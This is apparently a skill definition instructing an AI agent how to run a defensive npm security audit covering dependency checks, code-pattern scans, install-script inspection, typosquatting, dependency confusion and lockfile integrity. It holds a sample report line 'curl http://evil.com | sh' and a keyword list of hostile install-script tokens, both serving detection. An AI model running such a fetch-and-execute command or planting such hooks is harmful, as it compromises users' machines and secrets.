---
name: security-scan
description: >
  Full security audit of the current npm project. Use when the user types /security-scan
  or asks to "scan the project", "audit dependencies", "check project security",
  "run a security analysis", or "find vulnerabilities in this project".
argument-hint: [--fix] [--json] [--no-code] [--deep]
allowed-tools: [Bash, Read, Glob, Grep, Write]
---

# /security-scan

Performs a comprehensive security analysis of the current project: dependencies,
code patterns, configuration files, and cross-references with the local vulnerability DB.

## Arguments

$ARGUMENTS

- `--fix`: Attempt to auto-fix safe vulnerabilities via `npm audit fix`
- `--json`: Output a machine-readable JSON report saved to `security-scan-report.json`
- `--no-code`: Skip static code analysis (only scan dependencies)
- `--deep`: Full supply chain analysis — scans the entire transitive dependency tree
  (all packages of packages), detects install script abuse, typosquatting, dependency
  confusion attacks, and lockfile tampering. Slower but much more thorough.

---

## Instructions

### Step 0 — Verify project

Check that a `package.json` exists in the current directory. If not, tell the user
this command must be run from the root of an npm project and stop.

Read `package.json` to get project name, version, and dependency list.

### Step 1 — Dependency audit via npm audit

Run:
```bash
npm audit --json 2>/dev/null
```

If npm audit returns valid JSON, parse it. Extract for each finding:
- Package name and affected version range
- Severity (critical / high / moderate / low)
- CVE identifier (if available)
- Fix availability (`fixAvailable` field)
- Path (which package introduced it)

If `npm audit --json` fails, fall back to:
```bash
npm audit 2>&1
```
and parse the text output.

If `--fix` was passed and there are fixable issues, run:
```bash
npm audit fix
```
then re-run the audit to confirm fixes.

### Step 2 — Cross-reference with local vulnerability DB

Read the vulnerability database from `data/vulnerabilities.json` relative to the
plugin root (`C:/Sistemas/npm_claude_skill_security/data/vulnerabilities.json`),
or `~/.claude/npm-security/vulnerabilities.json` as fallback.

For each dependency in `package.json` (both `dependencies` and `devDependencies`):
- Check if it appears in the local DB (case-insensitive package name match)
- If found, flag it with the DB entry details (date, priority, CVE, OWASP category)

This catches vulnerabilities that `npm audit` may miss (unmaintained packages, supply chain risks).

### Step 3 — Static code analysis (skip if `--no-code` passed)

Scan all `.js`, `.ts`, `.jsx`, `.tsx`, `.mjs`, `.cjs` files in the project
(excluding `node_modules/`, `dist/`, `build/`, `.git/`).

Use Grep to find these patterns and report file + line number for each match:

| Pattern | Risk | OWASP |
|---|---|---|
| `eval(` | Code injection | A03:2021 |
| `new Function(` | Code injection | A03:2021 |
| `child_process.exec(` | Command injection | A03:2021 |
| `execSync(` | Command injection | A03:2021 |
| `\.innerHTML\s*=` | XSS | A03:2021 |
| `dangerouslySetInnerHTML` | XSS | A03:2021 |
| `document\.write(` | XSS | A03:2021 |
| `pickle\.loads` | Deserialization | A08:2021 |
| `Math\.random()` used for auth/token | Weak randomness | A02:2021 |
| `http://` in fetch/axios/request calls | Insecure transport | A02:2021 |
| `process\.env\.[A-Z_]+` logged directly | Secret leakage | A02:2021 |
| `console\.log.*password\|secret\|token\|key` | Secret leakage | A02:2021 |
| `\.env` files committed (check .gitignore) | Credential exposure | A02:2021 |

For each match, note: file path, line number, matched text (truncated), risk level.

### Step 4 — Configuration checks

Check these files if they exist:

**`.gitignore`** — warn if any of these are missing:
- `.env`, `.env.*`, `*.pem`, `*.key`, `secrets.*`, `config/local.*`

**`package.json`** — flag:
- Scripts with `postinstall` or `preinstall` that run unknown commands
- Version ranges using `*` or `latest` in production `dependencies` (not devDependencies)
- Version ranges using `^` or `~` in production `dependencies` — semver ranges allow
  future versions to be resolved automatically; a compromised minor/patch release
  (e.g. the axios 2026 attack on `1.14.1`) installs silently if the range allows it.
  Recommend pinning exact versions for production deps: `"axios": "1.14.0"` not `"^1.14.0"`
- Missing `engines` field (no Node.js version constraint)
- Missing `overrides` field for known vulnerable transitive dependencies — if the DB
  contains a CRITICAL/HIGH entry for a package that appears in the dependency tree,
  recommend adding it to `overrides` to pin it to a safe version:
  ```json
  "overrides": { "axios": "1.14.0" }
  ```

**`.npmrc`** — check for:
- `//registry.npmjs.org/:_authToken=` hardcoded (should use env var)
- Any hardcoded credentials
- **Absence of `ignore-scripts=true`** — flag as HIGH if not set. This single line
  blocks the primary vector of supply chain attacks (malicious `postinstall` hooks).
  Note: packages requiring native compilation (esbuild, sharp, node-gyp) need their
  scripts re-enabled explicitly per-package. Inform the user of this tradeoff.

**`Dockerfile` / `docker-compose.yml`** — if present, flag:
- `npm install` without `--omit=dev` in production stage
- Missing `npm ci` (uses install instead)
- Running as root user

### Step 5 — Supply chain analysis (only if `--deep` passed)

This step analyzes the **complete transitive dependency tree**, not just the packages
listed in `package.json`. A malicious package 4 levels deep is just as dangerous.

#### 5a — Extract the full dependency tree

Run:
```bash
npm ls --all --json 2>/dev/null
```

This returns every package installed recursively. Flatten the tree into a list of unique
`{name, version, depth, introducedBy}` entries. Warn the user if the tree has > 500 nodes
(large projects may take longer to analyze).

Also extract the list of direct dependency names for use in 5d (confusion detection).

#### 5b — Inspect install scripts across the entire tree

For each unique package in the flattened tree, run:
```bash
npm view {name}@{version} scripts --json 2>/dev/null
```

Flag any package that declares **`preinstall`**, **`postinstall`**, or **`prepare`** scripts.
These scripts execute arbitrary code during `npm install` — they are the primary vector
for supply chain malware.

For each flagged package:
- Show: package name, version, depth in tree, script content (first 120 chars)
- Classify risk:
  - **CRITICAL** if the script contains: `curl`, `wget`, `fetch`, `http`, `base64`,
    `eval`, `exec`, `child_process`, `require('os')`, `process.env`, `rm -rf`, `powershell`
  - **HIGH** if script is non-empty and not a well-known build tool (e.g. `node-gyp rebuild`,
    `husky install`, `patch-package`)
  - **INFO** for known safe patterns (node-gyp, husky, esbuild postinstall, etc.)

Known safe install scripts (do not flag as HIGH/CRITICAL):
- `node-gyp rebuild` — native addon compilation
- `husky install` or `husky` — git hooks manager
- `patch-package` — dependency patching
- `esbuild` postinstall — binary download for bundler

#### 5c — Metadata heuristics per package

For each package in the tree, fetch its registry metadata:
```bash
npm view {name} --json 2>/dev/null
```

Apply these heuristic checks and score each package:

| Check | Flag condition | Risk |
|---|---|---|
| Publish date | Published < 7 days ago AND < 1000 weekly downloads | HIGH |
| Maintainer count | Only 1 maintainer | MEDIUM |
| Last publish | Last version published > 3 years ago (abandoned) | MEDIUM |
| Version jump | Current version is ≥ 10x the previous (e.g. 1.0.0 → 10.0.0) | HIGH |
| Package size | Minified size grew > 300% from previous version | HIGH |
| Maintainer change | `_npmUser` differs from previous version's publisher | HIGH |
| Maintainer email domain | Publisher email changed to free provider (proton.me, gmail.com, yahoo.com, hotmail.com, outlook.com) — primary indicator of account hijacking (axios 2026 attack) | CRITICAL |
| Download count | < 100 weekly downloads AND not a private/scoped package | MEDIUM |
| License | No license field | LOW |
| Repository | No `repository` field | LOW |

Only report packages with at least one MEDIUM or higher flag. Group results by risk level.

#### 5d — Typosquatting detection

For every package in the full dependency tree, check if its name is suspiciously similar
to a well-known package using these rules:

1. **Edit distance ≤ 2** from any of these popular packages:
   `react, lodash, express, axios, webpack, babel, eslint, prettier, typescript,
    moment, jquery, vue, angular, next, nuxt, rollup, vite, jest, mocha, chalk,
    commander, yargs, dotenv, cors, helmet, passport, mongoose, sequelize, redis,
    socket.io, uuid, bcrypt, jsonwebtoken, nodemailer, multer, sharp, cheerio`

2. **Character substitution patterns** — flag names like:
   - Double letters: `reacct`, `expresss`
   - Missing letters: `reac`, `lodsh`
   - Letter swap: `loadsh`, `expres`
   - Hyphen variants: `react-dom` vs `reactdom`, `lodash` vs `lo-dash`
   - Suffix confusion: `colors` vs `colour`, `faker` vs `fakejs`

3. **Scoped confusion** — flag `@myorg/react` or `react-core` if they are not in your
   known dependency list but appear in the transitive tree.

For each typosquatting candidate: show the suspect name → likely intended package → risk.

#### 5e — Dependency confusion attack detection

This attack works when a private/internal package name (e.g. `@mycompany/utils`) also
exists on the public npm registry. npm may resolve the public one instead of the private one.

Steps:
1. Identify all **scoped packages** (`@scope/name`) in `package.json` and the full tree.
2. For each scoped package, run:
   ```bash
   npm view {name} --json 2>/dev/null
   ```
3. If it resolves successfully AND the `.npmrc` or `package.json` does NOT explicitly
   set a private registry for that scope → flag as **CRITICAL** dependency confusion risk.
4. Also check unscoped packages listed in `package.json` that have no npmjs.com page
   (private package names that might be registered by an attacker).

For each flagged package, explain: "This package resolves from the public npm registry
but may be intended as an internal package. Verify `.npmrc` sets `@scope:registry=...`."

#### 5f — Lockfile integrity verification

Check `package-lock.json` (or `yarn.lock` / `pnpm-lock.yaml` if present):

1. **Lockfile exists** — if missing, flag HIGH: "No lockfile found. Run `npm install` to
   generate one and commit it."

2. **Integrity hashes** — for a sample of 20 random packages in `package-lock.json`,
   check that the `integrity` field (SHA-512) is present and follows the format
   `sha512-<base64>`. Flag any package missing an integrity hash as HIGH.

3. **Registry source** — scan all `resolved` URLs in the lockfile. Flag any package
   that resolves from a registry other than `https://registry.npmjs.org` unless a
   private registry is explicitly configured in `.npmrc`.

4. **Manual tampering detection** — check if `package-lock.json` was modified more
   recently than `node_modules/.package-lock.json`. If so, warn: "Lockfile was modified
   without reinstalling — run `npm ci` to verify integrity."

5. **Lockfile version** — warn if `lockfileVersion` is < 2 (older format lacks integrity
   hashes for all packages).

#### 5g — Dependency injection detection

This check catches the specific attack vector used in the **axios 2026 supply chain attack**:
a compromised maintainer published a new version that silently added a brand-new dependency
(`plain-crypto-js`) that never existed in any previous release. The injected package then ran
a malicious postinstall script.

For each **direct** dependency in `package.json`:

1. Get the currently installed version: `npm view {name} version`
2. Get the previous version: `npm view {name} versions --json` → pick the version immediately
   before the current one
3. Compare their dependency lists:
   ```bash
   npm view {name}@{current} dependencies --json 2>/dev/null
   npm view {name}@{previous} dependencies --json 2>/dev/null
   ```
4. Any dependency key that is present in `{current}` but **absent in `{previous}`** is a
   **new injection candidate**. Flag each one:
   - **CRITICAL** if the injected package is very new (< 30 days old), has < 1000 weekly
     downloads, has no repository field, or itself has a postinstall/preinstall script
   - **HIGH** if the injected package is not listed on `socket.dev`, has no `repository`
     field, or was published by a different author than the parent package
   - **MEDIUM** for all other new dependencies that have no prior history with the parent

   Output format:
   ```
   CRITICAL  axios@1.14.1  ← new dep injected: plain-crypto-js@4.2.1
             plain-crypto-js: published 2026-03-30, 0 weekly downloads, has postinstall
             Action: downgrade to axios@1.14.0 immediately; rotate all secrets
   ```

5. Skip known safe transitions (e.g. packages that added a peer dependency documented in
   their changelog, or packages where the new dep is a major known package with > 1M downloads
   and existed before the parent's publish date).

This check only runs on the **direct** dependencies (not the full tree) to keep it fast.
For full transitive coverage, the install-script scan (5b) provides the second layer of defense.

### Step 6 — Compile and display report

Print the full report in this structure:

```
╔══════════════════════════════════════════════════════════════╗
║              NPM SECURITY SCAN — {project name}             ║
╚══════════════════════════════════════════════════════════════╝
  Date:     {today}
  Project:  {name}@{version}
  Deps:     {N} production | {N} dev
  Mode:     {standard | deep (full supply chain)}
──────────────────────────────────────────────────────────────

── [1] npm audit ──────────────────────────────────────────────
  CRITICAL  {N}
  HIGH      {N}
  MEDIUM    {N}
  LOW       {N}

  {date} - {vuln description} - {SEVERITY}
       CVE: {CVE}  |  Fix: {available/unavailable}  |  Path: {path}
  ...

── [2] Local DB matches ───────────────────────────────────────
  {date} - {vuln description} - {PRIORITY}
       Package: {pkg}  |  OWASP: {category}  |  CVE: {CVE}
  ...
  (none found — ✅)

── [3] Code patterns ─────────────────────────────────────────
  {file}:{line}  eval(        → Code injection risk (A03:2021)
  {file}:{line}  .innerHTML = → XSS risk (A03:2021)
  ...
  (none found — ✅)

── [4] Configuration ─────────────────────────────────────────
  ⚠️  .gitignore missing: .env
  ⚠️  package.json: "axios": "*" — unpinned version
  ✅  .npmrc looks clean
  ...

── [5] Supply chain — Install scripts (deep only) ────────────
  CRITICAL  {pkg}@{ver}  (depth: {N}, via: {parent})
            postinstall: "curl http://evil.com | sh"
  HIGH      {pkg}@{ver}  (depth: {N})
            postinstall: "node ./scripts/setup.js"  ← unknown script
  INFO      node-gyp@9.4.0  preinstall: "node-gyp rebuild"  ← known safe
  ...
  (none flagged — ✅)

── [6] Supply chain — Package metadata heuristics (deep) ─────
  HIGH   {pkg}@{ver}  published 3 days ago | 42 weekly downloads
  HIGH   {pkg}@{ver}  maintainer changed in this version
  MED    {pkg}@{ver}  single maintainer, last publish 4 years ago
  ...
  (none flagged — ✅)

── [7] Typosquatting detection (deep) ────────────────────────
  HIGH   loadsh@1.0.2  →  likely intended: lodash  (edit distance: 1)
  HIGH   expres@4.0.0  →  likely intended: express  (missing letter)
  ...
  (none found — ✅)

── [8] Dependency confusion (deep) ───────────────────────────
  CRITICAL  @mycompany/utils  resolves from PUBLIC npm registry
            Fix: add to .npmrc → @mycompany:registry=https://your-registry
  ...
  (none found — ✅)

── [10] Dependency injection detection (deep) ────────────────
  CRITICAL  axios@1.14.1  ← new dep injected: plain-crypto-js@4.2.1
            plain-crypto-js: 0 weekly downloads, has postinstall script
  ...
  (none found — ✅)

── [9] Lockfile integrity (deep) ─────────────────────────────
  ✅  package-lock.json present (lockfileVersion: 3)
  ✅  All sampled integrity hashes valid (SHA-512)
  ⚠️  lodash resolved from https://custom-registry.example.com
      (not in .npmrc — verify this is intentional)
  ...

──────────────────────────────────────────────────────────────
  SUMMARY
  ───────
  Direct vulnerabilities (npm audit): {N} critical/high
  Local DB matches:                   {N}
  Code risks:                         {N}
  Config warnings:                    {N}
  [deep] Install script risks:        {N} critical | {N} high
  [deep] Metadata anomalies:          {N}
  [deep] Typosquatting suspects:      {N}
  [deep] Dependency confusion:        {N}
  [deep] Dependency injection:        {N}
  [deep] Lockfile issues:             {N}

  Overall risk:  🔴 HIGH  /  🟡 MEDIUM  /  🟢 LOW

  Next steps:
  • Run /update-security to refresh the vulnerability database
  • Run `npm audit fix` for auto-fixable dependency issues
  • Review install scripts flagged as CRITICAL/HIGH manually
  • Pin exact versions for all flagged packages
  • OWASP A06:2021: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
  • OWASP A08:2021: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
──────────────────────────────────────────────────────────────
```

Overall risk level:
- 🔴 HIGH: any CRITICAL finding anywhere, or > 3 HIGH findings, or any dependency confusion, or any dependency injection detected
- 🟡 MEDIUM: any HIGH finding, or > 3 code risks, or typosquatting detected
- 🟢 LOW: only LOW/INFO findings and no supply chain anomalies

### Step 6 — JSON report (only if `--json` passed)

Write `security-scan-report.json` in the current directory with this structure:

```json
{
  "project": "name@version",
  "scanned_at": "YYYY-MM-DD",
  "mode": "standard|deep",
  "overall_risk": "HIGH|MEDIUM|LOW",
  "npm_audit": { "critical": N, "high": N, "medium": N, "low": N, "findings": [...] },
  "db_matches": [...],
  "code_risks": [{ "file": "...", "line": N, "pattern": "...", "risk": "...", "owasp": "..." }],
  "config_warnings": [...],
  "supply_chain": {
    "tree_size": N,
    "install_script_risks": [
      {
        "package": "...", "version": "...", "depth": N, "introduced_by": "...",
        "script_type": "postinstall", "script_content": "...", "risk": "CRITICAL|HIGH|INFO",
        "reason": "..."
      }
    ],
    "metadata_anomalies": [
      {
        "package": "...", "version": "...", "flags": ["new_package", "maintainer_changed"],
        "risk": "HIGH|MEDIUM", "details": "..."
      }
    ],
    "typosquatting": [
      { "suspect": "...", "likely_intended": "...", "edit_distance": N, "risk": "HIGH" }
    ],
    "dependency_confusion": [
      { "package": "...", "resolves_from": "public_npm", "risk": "CRITICAL", "fix": "..." }
    ],
    "dependency_injection": [
      {
        "package": "...", "version": "...", "previous_version": "...",
        "injected_dep": "...", "injected_dep_version": "...",
        "risk": "CRITICAL|HIGH|MEDIUM", "reason": "..."
      }
    ],
    "lockfile": {
      "present": true, "version": N, "integrity_valid": true,
      "issues": [...]
    }
  },
  "summary": {
    "critical_high": N, "medium_low": N, "code_risks": N, "config": N,
    "install_script_critical": N, "install_script_high": N,
    "typosquatting": N, "dependency_confusion": N, "dependency_injection": N, "lockfile_issues": N
  }
}
```

Tell the user the file was saved and its path.
